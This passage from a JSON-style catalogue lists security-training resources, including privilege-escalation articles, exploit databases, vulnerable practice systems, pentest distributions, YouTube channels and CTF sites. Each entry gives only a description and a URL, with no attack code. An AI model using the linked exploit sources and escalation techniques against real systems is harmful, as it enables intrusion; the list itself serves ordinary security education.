    "url": "http://www.hackingarticles.in/4-ways-get-linux-privilege-escalation/",
    "difficulty": "Intermediate",
    "tags": ["linux", "privilege escalation", "examples"]
  },
  {
    "id": "pe-3",
    "title": "Abusing SUDO (Linux Privilege Escalation)",
    "description": "Abusing SUDO (Linux Privilege Escalation)",
    "type": "Article",
    "category": "Privilege Escalation",
    "url": "http://touhidshaikh.com/blog/?p=790",
    "difficulty": "Intermediate",
    "tags": ["linux", "sudo", "privilege escalation"]
  },
  {
    "id": "pe-4",
    "title": "AutoLocalPrivilegeEscalation",
    "description": "automated scripts that downloads and compiles from exploitdb",
    "type": "Tool",
    "category": "Privilege Escalation",
    "url": "https://github.com/ngalongc/AutoLocalPrivilegeEscalation",
    "difficulty": "Advanced",
    "tags": ["automation", "script", "exploitdb"]
  },
  {
    "id": "pe-5",
    "title": "Basic linux privilege escalation",
    "description": "basic linux exploitation, also covers Windows",
    "type": "Article",
    "category": "Privilege Escalation",
    "url": "https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/",
    "difficulty": "Beginner",
    "tags": ["linux", "windows", "basics"]
  },
  {
    "id": "pe-6",
    "title": "Common Windows Privilege Escalation Vectors",
    "description": "Common Windows Privilege Escalation Vectors",
    "type": "Article",
    "category": "Privilege Escalation",
    "url": "https://www.toshellandback.com/2015/11/24/ms-priv-esc/",
    "difficulty": "Intermediate",
    "tags": ["windows", "privilege escalation", "vectors"]
  },
  {
    "id": "pe-7",
    "title": "Editing /etc/passwd File for Privilege Escalation",
    "description": "Editing /etc/passwd File for Privilege Escalation",
    "type": "Article",
    "category": "Privilege Escalation",
    "url": "http://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/",
    "difficulty": "Intermediate",
    "tags": ["linux", "passwd", "file editing"]
  },
  {
    "id": "pe-8",
    "title": "Linux Privilege Escalation",
    "description": "Linux Privilege Escalation – Tradecraft Security Weekly (Video)",
    "type": "Video",
    "category": "Privilege Escalation",
    "url": "https://securityweekly.com/2017/12/17/linux-privilege-escalation-tradecraft-security-weekly-22/",
    "difficulty": "Intermediate",
    "tags": ["linux", "video", "security weekly"]
  },
  {
    "id": "pe-9",
    "title": "Linux Privilege Escalation Check Script",
    "description": "a simple linux PE check script",
    "type": "Tool",
    "category": "Privilege Escalation",
    "url": "https://github.com/sleventyeleven/linuxprivchecker",
    "difficulty": "Beginner",
    "tags": ["script", "automation", "linux"]
  },
  {
    "id": "ma-1",
    "title": "Malware traffic analysis",
    "description": "list of traffic analysis exercises",
    "type": "Resource",
    "category": "Malware Analysis",
    "url": "http://www.malware-traffic-analysis.net/",
    "difficulty": "Intermediate",
    "tags": ["malware", "traffic", "analysis"]
  },
  {
    "id": "ma-2",
    "title": "Malware Analysis - CSCI 4976",
    "description": "another class from the folks at RPISEC, quality content",
    "type": "Course",
    "category": "Malware Analysis",
    "url": "https://github.com/RPISEC/Malware/blob/master/README.md",
    "difficulty": "Advanced",
    "tags": ["course", "rpis", "malware"]
  },
  {
    "id": "ns-1",
    "title": "Foot Printing with WhoIS/DNS records",
    "description": "a white paper from SANS",
    "type": "Paper",
    "category": "Network Scanning / Reconnaissance",
    "url": "https://www.sans.org/reading-room/whitepapers/hackers/fundamentals-computer-hacking-956",
    "difficulty": "Beginner",
    "tags": ["footprinting", "dns", "whois"]
  },
  {
    "id": "ns-2",
    "title": "Google Dorks/Google Hacking",
    "description": "list of commands for google hacks, unleash the power of the world's biggest search engine",
    "type": "Cheat Sheet",
    "category": "Network Scanning / Reconnaissance",
    "url": "https://d4msec.wordpress.com/2015/09/03/google-dorks-for-finding-emails-admin-users-etc/",
    "difficulty": "Beginner",
    "tags": ["google", "dorks", "search"]
  },
  {
    "id": "vwa-1",
    "title": "bWAPP",
    "description": "common buggy web app for hacking, great for beginners, lots of documentation",
    "type": "Vulnerable Application",
    "category": "Vulnerable Web Application",
    "url": "http://www.itsecgames.com/",
    "difficulty": "Beginner",
    "tags": ["web", "vulnerable", "practice"]
  },
  {
    "id": "vwa-2",
    "title": "Damn Small Vulnerable Web",
    "description": "written in less than 100 lines of code, this web app has tons of vulns, great for teaching",
    "type": "Vulnerable Application",
    "category": "Vulnerable Web Application",
    "url": "https://github.com/stamparm/DSVW",
    "difficulty": "Beginner",
    "tags": ["web", "small", "vulnerable"]
  },
  {
    "id": "vwa-3",
    "title": "Damn Vulnerable Web Application (DVWA)",
    "description": "PHP/MySQL web app for testing skills and tools",
    "type": "Vulnerable Application",
    "category": "Vulnerable Web Application",
    "url": "http://www.dvwa.co.uk/",
    "difficulty": "Beginner",
    "tags": ["web", "php", "mysql"]
  },
    {
    "id": "vos-1",
    "title": "General Test Environment Guidance",
    "description": "white paper from the pros at rapid7",
    "type": "Paper",
    "category": "Vulnerable OS",
    "url": "https://community.rapid7.com/docs/DOC-2196",
    "difficulty": "Intermediate",
    "tags": ["rapid7", "test environment", "guidance"]
  },
  {
    "id": "vos-2",
    "title": "Metasploitable2 (Linux)",
    "description": "vulnerable OS, great for practicing hacking",
    "type": "Vulnerable OS",
    "category": "Vulnerable OS",
    "url": "https://sourceforge.net/projects/metasploitable/files/Metasploitable2/",
    "difficulty": "Beginner",
    "tags": ["metasploitable", "linux", "practice"]
  },
  {
    "id": "vos-3",
    "title": "Metasploitable3",
    "description": "the third installation of this vulnerable OS",
    "type": "Vulnerable OS",
    "category": "Vulnerable OS",
    "url": "https://github.com/rapid7/metasploitable3",
    "difficulty": "Intermediate",
    "tags": ["metasploitable", "windows", "practice"]
  },
  {
    "id": "vos-4",
    "title": "Vulnhub",
    "description": "collection of tons of different vulnerable OS and challenges",
    "type": "Resource",
    "category": "Vulnerable OS",
    "url": "https://www.vulnhub.com/",
    "difficulty": "All Levels",
    "tags": ["vulnerable", "challenges", "vm"]
  },
  {
    "id": "lpt-2",
    "title": "BackBox",
    "description": "open source community project, promoting security in IT enivornments",
    "type": "Penetration Testing OS",
    "category": "Linux Penetration Testing OS",
    "url": "https://backbox.org/index",
    "difficulty": "Intermediate",
    "tags": ["backbox", "pentesting", "linux"]
  },
  {
    "id": "lpt-3",
    "title": "BlackArch",
    "description": "Arch Linux based pentesting distro, compatible with Arch installs",
    "type": "Penetration Testing OS",
    "category": "Linux Penetration Testing OS",
    "url": "https://blackarch.org/index.html",
    "difficulty": "Advanced",
    "tags": ["blackarch", "arch linux", "pentesting"]
  },
  {
    "id": "lpt-4",
    "title": "Bugtraq",
    "description": "advanced GNU Linux pen-testing technology",
    "type": "Penetration Testing OS",
    "category": "Linux Penetration Testing OS",
    "url": "http://bugtraq-team.com/",
    "difficulty": "Advanced",
    "tags": ["bugtraq", "gnu", "linux"]
  },
  {
    "id": "lpt-5",
    "title": "Docker for pentest",
    "description": "Image with the more used tools to create a pentest environment easily and quickly.",
    "type": "Tool",
    "category": "Linux Penetration Testing OS",
    "url": "https://github.com/aaaguirrep/pentest",
    "difficulty": "Intermediate",
    "tags": ["docker", "pentest", "container"]
  },
  {
    "id": "lpt-6",
    "title": "Kali",
    "description": "the infamous pentesting distro from the folks at Offensive Security",
    "type": "Penetration Testing OS",
    "category": "Linux Penetration Testing OS",
    "url": "http://kali.org/",
    "difficulty": "All Levels",
    "tags": ["kali", "offensive security", "pentesting"]
  },
  {
    "id": "exp-1",
    "title": "0day.today",
    "description": "Easy to navigate database of exploits",
    "type": "Exploit Database",
    "category": "Exploits",
    "url": "http://0day.today/",
    "difficulty": "Advanced",
    "tags": ["0day", "exploits", "database"]
  },
  {
    "id": "exp-2",
    "title": "Exploit Database",
    "description": "database of a wide variety exploits, CVE compliant archive",
    "type": "Exploit Database",
    "category": "Exploits",
    "url": "https://www.exploit-db.com/",
    "difficulty": "Advanced",
    "tags": ["exploit-db", "cve", "archive"]
  },
  {
    "id": "exp-3",
    "title": "CXsecurity",
    "description": "Indie cybersecurity info managed by 1 person",
    "type": "Resource",
    "category": "Exploits",
    "url": "https://cxsecurity.com/exploit/",
    "difficulty": "Intermediate",
    "tags": ["cxsecurity", "exploits", "vulnerabilities"]
  },
  {
    "id": "exp-4",
    "title": "Snyk Vulnerability DB",
    "description": "detailed info and remediation guidance for known vulns, also allows you to test your code",
    "type": "Database",
    "category": "Exploits",
    "url": "https://snyk.io/vuln/",
    "difficulty": "Intermediate",
    "tags": ["snyk", "vulnerability", "remediation"]
  },
  {
    "id": "for-3",
    "title": "CODEBY.NET",
    "description": "hacker, WAPT, malware, computer engineering, Reverse engineering, forensics - russian based forum",
    "type": "Forum",
    "category": "Forums",
    "url": "https://codeby.net/",
    "difficulty": "All Levels",
    "tags": ["forum", "russian", "wapt"]
  },
 

  {
    "id": "asc-3",
    "title": "infocondb.org",
    "description": "a site that aims to catalog and cross-reference all hacker conferences.",
    "type": "Database",
    "category": "Archived Security Conference Videos",
    "url": "https://infocondb.org/",
    "difficulty": "All Levels",
    "tags": ["conferences", "database", "archive"]
  },


  {
    "id": "asc-1",
    "title": "InfoCon.org",
    "description": "hosts data from hundreds of cons",
    "type": "Archive",
    "category": "Archived Security Conference Videos",
    "url": "https://infocon.org/cons/",
    "difficulty": "All Levels",
    "tags": ["conferences", "archive", "videos"]
  },
  {
    "id": "asc-2",
    "title": "Irongeek",
    "description": "Website of Adrien Crenshaw, hosts a ton of info.",
    "type": "Resource",
    "category": "Archived Security Conference Videos",
    "url": "http://www.irongeek.com/",
    "difficulty": "All Levels",
    "tags": ["irongeek", "videos", "tutorials"]
  },

  {
    "id": "oc-1",
    "title": "Hacktoday",
    "description": "requires an account, covering all kinds of hacking topics",
    "type": "Community",
    "category": "Online Communities",
    "url": "https://www.hacktoday.net/",
    "difficulty": "All Levels",
    "tags": ["community", "forum", "hacking"]
  },
  {
    "id": "oc-2",
    "title": "Hack+",
    "description": "link requires telegram to be used",
    "type": "Community",
    "category": "Online Communities",
    "url": "http://t.me/hacking_group_channel",
    "difficulty": "All Levels",
    "tags": ["telegram", "group", "hacking"]
  },
  {
    "id": "oc-3",
    "title": "MPGH",
    "description": "community of MultiPlayerGameHacking",
    "type": "Community",
    "category": "Online Communities",
    "url": "http://mpgh.net",
    "difficulty": "All Levels",
    "tags": ["gaming", "hacking", "community"]
  },
  {
    "id": "ons-1",
    "title": "InfoSec",
    "description": "covers all the latest infosec topics",
    "type": "News",
    "category": "News",
    "url": "http://www.infosecurity-magazine.com/",
    "difficulty": "All Levels",
    "tags": ["news", "magazine", "infosec"]
  },

  {
    "id": "ons-3",
    "title": "Security Intell",
    "description": "covers all kinds of news, great intelligence resources",
    "type": "News",
    "category": "News",
    "url": "https://securityintelligence.com/news/",
    "difficulty": "All Levels",
    "tags": ["news", "intelligence", "security"]
  },
  {
    "id": "ons-4",
    "title": "Threatpost",
    "description": "covers all the latest threats and breaches",
    "type": "News",
    "category": "News",
    "url": "https://threatpost.com/",
    "difficulty": "All Levels",
    "tags": ["threats", "breaches", "news"]
  },
  {
    "id": "ons-5",
    "title": "Secjuice",
    "description": "Security news and articles",
    "type": "News",
    "category": "News",
    "url": "https://secjuice.com/",
    "difficulty": "All Levels",
    "tags": ["security", "news", "articles"]
  },
  {
    "id": "ons-6",
    "title": "The Hacker News",
    "description": "features a daily stream of hack news, also has an app",
    "type": "News",
    "category": "News",
    "url": "https://thehackernews.com/",
    "difficulty": "All Levels",
    "tags": ["hacker news", "daily", "app"]
  },
    {
      "id": "1",
      "title": "CS 642: Intro to Computer Security",
      "description": "Academic content, full semester course, includes assigned readings, homework and github refs for exploit examples. NO VIDEO LECTURES.",
      "type": "Course",
      "category": "Learning the Skills",
      "url": "http://pages.cs.wisc.edu/~ace/cs642-spring-2016.html",
      "difficulty": "Intermediate",
      "tags": ["academic", "computer security", "course"]
    },
    // {
    //   "id": "2",
    //   "title": "CyberSec WTF",
    //   "description": "CyberSec WTF Web Hacking Challenges from Bounty write-ups",
    //   "type": "Practice",
    //   "category": "Learning the Skills",
    //   "url": "https://cybersecurity.wtf",
    //   "difficulty": "Intermediate",
    //   "tags": ["web hacking", "challenges", "bounty"]
    // },
    {
      "id": "3",
      "title": "Cybrary",
      "description": "Coursera style website, lots of user-contributed content, account required, content can be filtered by experience level",
      "type": "Course",
      "category": "Learning the Skills",
      "url": "https://www.cybrary.it/",
      "difficulty": "Beginner",
      "tags": ["online learning", "cybersecurity", "courses"]
    },
    {
      "id": "4",
      "title": "Free Cyber Security Training",
      "description": "Academic content, 8 full courses with videos from a quirky instructor sam, links to research, defcon materials and other recommended training/learning",
      "type": "Course",
      "category": "Learning the Skills",
      "url": "https://www.samsclass.info/",
      "difficulty": "Beginner",
      "tags": ["academic", "free", "training"]
    },
    {
      "id": "5",
      "title": "Hak5",
      "description": "Podcast-style videos covering various topics, has a forum, \"metasploit-minute\" video series could be useful",
      "type": "YouTube",
      "category": "Learning the Skills",
      "url": "https://www.hak5.org/",
      "difficulty": "Beginner",
      "tags": ["podcast", "videos", "metasploit"]
    },
    // {
    //   "id": "6",
    //   "title": "Hopper's Roppers Security Training",
    //   "description": "Four free self-paced courses on Computing Fundamentals, Security, Capture the Flags, and a Practical Skills Bootcamp that help beginners build a strong base of foundational knowledge.",
    //   "type": "Course",
    //   "category": "Learning the Skills",
    //   "url": "https://hoppersroppers.org/training.html",
    //   "difficulty": "Beginner",
    //   "tags": ["free", "self-paced", "bootcamp"]
    // },
    // {
    //   "id": "7",
    //   "title": "Learning Exploitation with Offensive Computer Security 2.0",
    //   "description": "Blog-style instruction, includes: slides, videos, homework, discussion. No login required.",
    //   "type": "Blog",
    //   "category": "Learning the Skills",
    //   "url": "http://howto.hackallthethings.com/2016/07/learning-exploitation-with-offensive.html",
    //   "difficulty": "Intermediate",
    //   "tags": ["exploitation", "offensive security", "blog"]
    // },
    {
      "id": "8",
      "title": "Mind Maps",
      "description": "Information Security related Mind Maps",
      "type": "Documentation",
      "category": "Learning the Skills",
      "url": "http://www.amanhardikar.com/mindmaps.html",
      "difficulty": "Beginner",
      "tags": ["visual", "mind maps", "reference"]
    },
    {
      "id": "9",
      "title": "MIT OCW 6.858 Computer Systems Security",
      "description": "Academic content, well organized, full-semester course, includes assigned readings, lectures, videos, required lab files.",
      "type": "Course",
      "category": "Learning the Skills",
      "url": "https://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-858-computer-systems-security-fall-2014/",
      "difficulty": "Advanced",
      "tags": ["mit", "academic", "systems security"]
    },
    // {
    //   "id": "10",
    //   "title": "OffensiveComputerSecurity",
    //   "description": "Academic content, full semester course including 27 lecture videos with slides and assign readings",
    //   "type": "Course",
    //   "category": "Learning the Skills",
    //   "url": "https://www.cs.fsu.edu/~redwood/OffensiveComputerSecurity/lectures.html",
    //   "difficulty": "Advanced",
    //   "tags": ["academic", "lectures", "offensive security"]
    // },
    {
      "id": "11",
      "title": "OWASP top 10 web security risks",
      "description": "Free courseware, requires account",
      "type": "Course",
      "category": "Learning the Skills",
      "url": "https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project",
      "difficulty": "Beginner",
      "tags": ["owasp", "web security", "vulnerabilities"]
    },
    {
      "id": "12",
      "title": "SecurityTube",
      "description": "Tube-styled content, \"megaprimer\" videos covering various topics, no readable content on site.",
      "type": "YouTube",
      "category": "Learning the Skills",
      "url": "http://www.youtube.com/@HackingWorldTeam",
      "difficulty": "Intermediate",
      "tags": ["videos", "security", "tutorials"]
    },
    // {
    //   "id": "13",
    //   "title": "Seed Labs",
    //   "description": "Academic content, well organized, featuring lab videos, tasks, needed code files, and recommended readings",
    //   "type": "Course",
    //   "category": "Learning the Skills",
    //   "url": "http://www.cis.syr.edu/~wedu/seed/labs.html",
    //   "difficulty": "Intermediate",
    //   "tags": ["academic", "labs", "hands-on"]
    // },
    {
      "id": "14",
      "title": "TryHackMe",
      "description": "Designed prebuilt challenges which include virtual machines (VM) hosted in the cloud ready to be deployed",
      "type": "Practice",
      "category": "Learning the Skills",
      "url": "https://tryhackme.com/",
      "difficulty": "Beginner",
      "tags": ["hands-on", "ctf", "virtual labs"]
    },
        {
      "id": "youtube-1",
      "title": "0patch by ACROS Security",
      "description": "Few videos, very short, specific to 0patch",
      "type": "YouTube",
      "category": "YouTube Channels",
      "subcategory": "General",
      "url": "https://www.youtube.com/channel/UCwlGrzF4on-bjiBhD8lO3QA",
      "difficulty": "Intermediate",
      "tags": ["patching", "vulnerabilities", "short videos"]
    },
    {
      "id": "youtube-2",
      "title": "BlackHat",
      "description": "Features talks from the BlackHat conferences around the world",
      "type": "YouTube",
      "category": "YouTube Channels",
      "subcategory": "Conferences",
      "url": "https://www.youtube.com/channel/UCJ6q9Ie29ajGqKApbLqfBOg",
      "difficulty": "Advanced",
      "tags": ["conference", "talks", "research"]
    },
    {
      "id": "youtube-3",
      "title": "Christiaan008",
      "description": "Hosts a variety of videos on various security topics, disorganized",
      "type": "YouTube",
      "category": "YouTube Channels",
      "subcategory": "General",
      "url": "https://www.youtube.com/channel/UCEPzS1rYsrkqzSLNp76nrcg",
      "difficulty": "Intermediate",
      "tags": ["varied", "security", "tutorials"]
    },
    {
      "id": "youtube-4",
      "title": "Detectify",
      "description": "Very short videos, aimed at showing how to use Detectify scanner",
      "type": "YouTube",
      "category": "YouTube Channels",
      "subcategory": "Companies",
      "url": "https://www.youtube.com/channel/UCm6N84sAaQ-BiNdCaaLT4qg",
      "difficulty": "Beginner",
      "tags": ["scanner", "web security", "short videos"]
    },
    {
      "id": "youtube-5",
      "title": "Hak5",
      "description": "See Hak5 above",
      "type": "YouTube",
      "category": "YouTube Channels",
      "subcategory": "Companies",
      "url": "https://www.youtube.com/user/Hak5Darren",
      "difficulty": "Beginner",
      "tags": ["podcast", "videos", "metasploit"]
    },
    {
      "id": "youtube-6",
      "title": "Kaspersky Lab",
      "description": "Lots of Kaspersky promos, some hidden cybersecurity gems",
      "type": "YouTube",
      "category": "YouTube Channels",
      "subcategory": "Companies",
      "url": "https://www.youtube.com/channel/UCGhEv7BFBWdo0k4UXTm2eZg",
      "difficulty": "Beginner",
      "tags": ["antivirus", "security", "company"]
    },
    {
      "id": "youtube-7",
      "title": "Metasploit",
      "description": "Collection of medium length metasploit demos, ~25minutes each, instructional",
      "type": "YouTube",
      "category": "YouTube Channels",
      "subcategory": "Companies",
      "url": "https://www.youtube.com/channel/UCx4d2aRIfxfEUdS_5YIYKPg",
      "difficulty": "Intermediate",
      "tags": ["metasploit", "pentesting", "tutorials"]
    },
    {
      "id": "youtube-8",
      "title": "ntop",
      "description": "Network monitoring, packet analysis, instructional",
      "type": "YouTube",
      "category": "YouTube Channels",
      "subcategory": "Companies",
      "url": "https://www.youtube.com/channel/UCUYWuYlYKD5Yq5qBz0AIXJw/feed",
      "difficulty": "Intermediate",
      "tags": ["network", "monitoring", "packet analysis"]
    },
    {
      "id": "youtube-9",
      "title": "nVisium",
      "description": "Some nVisum promos, a handful of instructional series on Rails vulns and web hacking",
      "type": "YouTube",
      "category": "YouTube Channels",
      "subcategory": "Companies",
      "url": "https://www.youtube.com/channel/UCTE8R-Otq_kVTo08eLsfeyg",
      "difficulty": "Intermediate",
      "tags": ["rails", "web security", "tutorials"]
    },
    {
      "id": "youtube-10",
      "title": "OpenNSM",
      "description": "Network analysis, lots of TCPDUMP videos, instructional",
      "type": "YouTube",
      "category": "YouTube Channels",
      "subcategory": "Companies",
      "url": "https://www.youtube.com/user/OpenNSM/feed",
      "difficulty": "Advanced",
      "tags": ["network", "analysis", "tcpdump"]
    },
    {
      "id": "youtube-11",
      "title": "OWASP",
      "description": "See OWASP above",
      "type": "YouTube",
      "category": "YouTube Channels",
      "subcategory": "Companies",
      "url": "https://www.youtube.com/user/OWASPGLOBAL",
      "difficulty": "Beginner",
      "tags": ["owasp", "web security", "vulnerabilities"]
    },
    {
      "id": "youtube-12",
      "title": "Rapid7",
      "description": "Brief videos, promotional/instructional, ~5 minutes",
      "type": "YouTube",
      "category": "YouTube Channels",
      "subcategory": "Companies",
      "url": "https://www.youtube.com/channel/UCnctXOUIeRFu1BR5O0W5e9w",
      "difficulty": "Beginner",
      "tags": ["security", "company", "short videos"]
    },
    {
      "id": "youtube-13",
      "title": "Securelist",
      "description": "Brief videos, interviews discussing various cyber security topics",
      "type": "YouTube",
      "category": "YouTube Channels",
      "subcategory": "Companies",
      "url": "https://www.youtube.com/user/Securelist/featured",
      "difficulty": "Beginner",
      "tags": ["interviews", "security", "news"]
    },
    {
      "id": "youtube-15",
      "title": "SocialEngineerOrg",
      "description": "Podcast-style, instructional, lengthy content ~1 hr each",
      "type": "YouTube",
      "category": "YouTube Channels",
      "subcategory": "Companies",
      "url": "https://www.youtube.com/channel/UCC1vbVVbYdNe-OZRldj-U6g",
      "difficulty": "Intermediate",
      "tags": ["social engineering", "podcast", "long-form"]
    },
    {
      "id": "youtube-16",
      "title": "Sonatype",
      "description": "Lots of random videos, a good cluster of DevOps related content, large range of lengths, disorganized",
      "type": "YouTube",
      "category": "YouTube Channels",
      "subcategory": "Companies",
      "url": "https://www.youtube.com/user/sonatype/featured",
      "difficulty": "Intermediate",
      "tags": ["devops", "varied", "security"]
    },
    {
      "id": "youtube-17",
      "title": "SophosLabs",
      "description": "Lots of brief, news-style content, \"7 Deadly IT Sins\" segment is of note",
      "type": "YouTube",
      "category": "YouTube Channels",
      "subcategory": "Companies",
      "url": "https://www.youtube.com/user/SophosLabs/featured",
      "difficulty": "Beginner",
      "tags": ["news", "security", "short videos"]
    },
    {
      "id": "youtube-18",
      "title": "Sourcefire",
      "description": "Lots of brief videos covering topics like botnets, DDoS ~5 minutes each",
      "type": "YouTube",
      "category": "YouTube Channels",
      "subcategory": "Companies",
      "url": "https://www.youtube.com/user/SourcefireInc/featured",
      "difficulty": "Intermediate",
      "tags": ["botnets", "ddos", "short videos"]
    },
    {
      "id": "youtube-19",
      "title": "Station X",
      "description": "Handful of brief videos, disorganized, unscheduled content updates",
      "type": "YouTube",
      "category": "YouTube Channels",
      "subcategory": "Companies",
      "url": "https://www.youtube.com/channel/UC-vWmE-BHcUrYW5zwDijL1g",
      "difficulty": "Beginner",
      "tags": ["varied", "security", "tutorials"]
    },
    {
      "id": "youtube-20",
      "title": "Synack",
      "description": "Random, news-style videos, disorganized, non-instructional",
      "type": "YouTube",
      "category": "YouTube Channels",
      "subcategory": "Companies",
      "url": "https://www.youtube.com/channel/UCRH0mvESjZ7eKY1LJZDPIbw/featured",
      "difficulty": "Beginner",
      "tags": ["news", "security", "company"]
    },
    {
      "id": "youtube-21",
      "title": "TippingPoint Zero Day Initiative",
      "description": "Very brief videos ~30 sec, somewhat instructional",
      "type": "YouTube",
      "category": "YouTube Channels",
      "subcategory": "Companies",
      "url": "https://www.youtube.com/channel/UChbH7B5YhXANmlMYJRHpw0g",
      "difficulty": "Intermediate",
      "tags": ["zero day", "short videos", "security"]
    },
    {
      "id": "youtube-23",
      "title": "Vincent Yiu",
      "description": "Handful of videos from a single hacker, instructional",
      "type": "YouTube",
      "category": "YouTube Channels",
      "subcategory": "General",
      "url": "https://www.youtube.com/channel/UCFVI3_M1zqFzEok2sTeEP8w/featured",
      "difficulty": "Intermediate",
      "tags": ["hacker", "tutorials", "security"]
    },
    {
      "id": "youtube-24",
      "title": "44contv",
      "description": "Information security con based in London, lengthy instructional videos",
      "type": "YouTube",
      "category": "YouTube Channels",
      "subcategory": "Conferences",
      "url": "https://www.youtube.com/user/44contv",
      "difficulty": "Advanced",
      "tags": ["conference", "security", "long-form"]
    },
    {
      "id": "youtube-25",
      "title": "BruCON Security Conference",
      "description": "Security and hacker conference based in Belgium, lots of lengthy instructional videos",
      "type": "YouTube",
      "category": "YouTube Channels",
      "subcategory": "Conferences",
      "url": "https://www.youtube.com/channel/UCqwMU1l90lf9BLersW6eAHw",
      "difficulty": "Advanced",
      "tags": ["conference", "hacking", "security"]
    },
  
  {
    "id": "cryptopals-2",
    "title": "The cryptopals crypto challenges",
    "description": "A bunch of CTF challenges, all focused on cryptography",
    "type": "CTF",
    "category": "Challenge Sites",
    "url": "http://cryptopals.com/",
    "difficulty": "Intermediate to Advanced",
    "tags": ["cryptography", "ctf"]
  },
  {
    "id": "crackmes-one-5",
    "title": "Crackmes.one",
    "description": "This is a simple place where you can download crackmes to improve your reverse engineering skills",
    "type": "Reverse Engineering",
    "category": "Challenge Sites",
    "url": "https://crackmes.one/",
    "difficulty": "Beginner to Advanced",
    "tags": ["reverse-engineering", "crackmes"]
  },
  {
    "id": "ctflearn-6",
    "title": "CTFLearn",
    "description": "An account-based CTF site, where users can go in and solve a range of challenges",
    "type": "CTF",
    "category": "Challenge Sites",
    "url": "https://ctflearn.com/",
    "difficulty": "Beginner to Advanced",
    "tags": ["ctf", "challenges"]
  },
  {
    "id": "ctf-writeups-7",
    "title": "CTFs write-ups",
    "description": "A collection of writeups from various CTFs, organized by year",
    "type": "Resources",
    "category": "Write-ups",
    "url": "https://github.com/ctfs",
    "difficulty": "All Levels",
    "tags": ["ctf", "writeups", "resources"]
  },
  {
    "id": "ctf365-8",
    "title": "CTF365",
    "description": "Account based CTF site, awarded by Kaspersky, MIT, T-Mobile",
    "type": "CTF",
    "category": "Challenge Sites",
    "url": "https://ctf365.com/",
    "difficulty": "Intermediate to Advanced",
    "tags": ["ctf", "security"]
  },
  {
    "id": "enigmagroup-9",
    "title": "The enigma group",
    "description": "Web application security training, account based, video tutorials",
    "type": "Web Security",
    "category": "Challenge Sites",
    "url": "https://www.enigmagroup.org/",
    "difficulty": "Beginner to Advanced",
    "tags": ["web-security", "training"]
  },

  {
    "id": "google-ctf-11",
    "title": "Google CTF",
    "description": "Source code of Google 2017, 2018 and 2019 CTF",
    "type": "CTF",
    "category": "Challenge Sites",
    "url": "https://github.com/google/google-ctf",
    "difficulty": "Advanced",
    "tags": ["ctf", "google"]
  },
  {
    "id": "google-ctf-2019-12",
    "title": "Google CTF 2019",
    "description": "2019 edition of the Google CTF contest",
    "type": "CTF",
    "category": "Challenge Sites",
    "url": "https://capturetheflag.withgoogle.com/",
    "difficulty": "Advanced",
    "tags": ["ctf", "google"]
  },
  {
    "id": "google-xss-13",
    "title": "Google's XSS game",
    "description": "XSS challenges, and potentially a chance to get paid!",
    "type": "Web Security",
    "category": "Challenge Sites",
    "url": "https://xss-game.appspot.com/",
    "difficulty": "Beginner to Intermediate",
    "tags": ["xss", "web-security"]
  },
  {
    "id": "hackthebox-14",
    "title": "Hack The Box",
    "description": "Pen testing labs hosting over 39 vulnerable machines with two additional added every month",
    "type": "Pentesting",
    "category": "Challenge Sites",
    "url": "https://www.hackthebox.com",
    "difficulty": "Beginner to Advanced",
    "tags": ["pentesting", "vms", "ctf"]
  },
  {
    "id": "hackertest-15",
    "title": "Hacker test",
    "description": "Similar to 'hackthissite', no account required",
    "type": "CTF",
    "category": "Challenge Sites",
    "url": "http://www.hackertest.net/",
    "difficulty": "Beginner to Intermediate",
    "tags": ["ctf", "challenges"]
  },
  {
    "id": "hackergateway-16",
    "title": "Hacker Gateway",
    "description": "CTFs covering steganography, cryptography, and web challenges, account required",
    "type": "CTF",
    "category": "Challenge Sites",
    "url": "https://www.hackergateway.com/",
    "difficulty": "Beginner to Advanced",
    "tags": ["ctf", "steganography", "cryptography", "web"]
  },
  {
    "id": "hacksplaining-17",
    "title": "Hacksplaining",
    "description": "A clickthrough security informational site, very good for beginners",
    "type": "Learning",
    "category": "Educational",
    "url": "https://www.hacksplaining.com/",
    "difficulty": "Beginner",
    "tags": ["learning", "security", "education"]
  },

  {
    "id": "hackthissite-20",
    "title": "Hack this site!",
    "description": "An oldy but goodie, account required, users start at low levels and progress in difficulty",
    "type": "CTF",
    "category": "Challenge Sites",
    "url": "https://www.hackthissite.org/",
    "difficulty": "Beginner to Advanced",
    "tags": ["ctf", "web-security"]
  },
  {
    "id": "lin-security-22",
    "title": "Lin.security",
    "description": "Practice your Linux privilege escalation",
    "type": "Pentesting",
    "category": "Challenge Sites",
    "url": "https://in.security/lin-security-practise-your-linux-privilege-escalation-foo/",
    "difficulty": "Intermediate to Advanced",
    "tags": ["linux", "privilege-escalation"]
  },
  // {
  //   "id": "noe-systems-23",
  //   "title": "noe.systems",
  //   "description": "Korean challenge site, requires an account",
  //   "type": "CTF",
  //   "category": "Challenge Sites",
  //   "url": "http://noe.systems/",
  //   "difficulty": "Intermediate",
  //   "tags": ["ctf", "challenges"]
  // },
  {
    "id": "overthewire-24",
    "title": "Over the wire",
    "description": "A CTF that's based on progressive levels for each lab, the users SSH in, no account required",
    "type": "CTF",
    "category": "Challenge Sites",
    "url": "http://overthewire.org/wargames/",
    "difficulty": "Beginner to Advanced",
    "tags": ["ctf", "wargames", "ssh"]
  },
  {
    "id": "wechall-25",
    "title": "Participating Challenge Sites",
    "description": "Aims at creating a universal ranking for CTF participants",
    "type": "Resources",
    "category": "Challenge Sites",
    "url": "http://www.wechall.net/active_sites/all/by/site_avg/DESC/page-1",
    "difficulty": "All Levels",
    "tags": ["ctf", "ranking", "resources"]
  },
  {
    "id": "pentesterlab-26",
    "title": "PentesterLab",
    "description": "Hosts a variety of exercises as well as various 'bootcamps' focused on specific activities",
    "type": "Pentesting",
    "category": "Challenge Sites",
    "url": "https://pentesterlab.com/",
    "difficulty": "Beginner to Advanced",
    "tags": ["pentesting", "exercises", "bootcamps"]
  },
  {
    "id": "pentestit-27",
    "title": "Pentestit",
    "description": "Account based CTF site, users have to install open VPN and get credentials",
    "type": "CTF",
    "category": "Challenge Sites",
    "url": "https://lab.pentestit.ru/",
    "difficulty": "Intermediate to Advanced",
    "tags": ["ctf", "pentesting"]
  },

  {
    "id": "pentesttraining-29",
    "title": "Pentest.training",
    "description": "Lots of various labs/VMs for you to try and hack, registry is optional",
    "type": "Pentesting",
    "category": "Challenge Sites",
    "url": "https://pentest.training",
    "difficulty": "Beginner to Advanced",
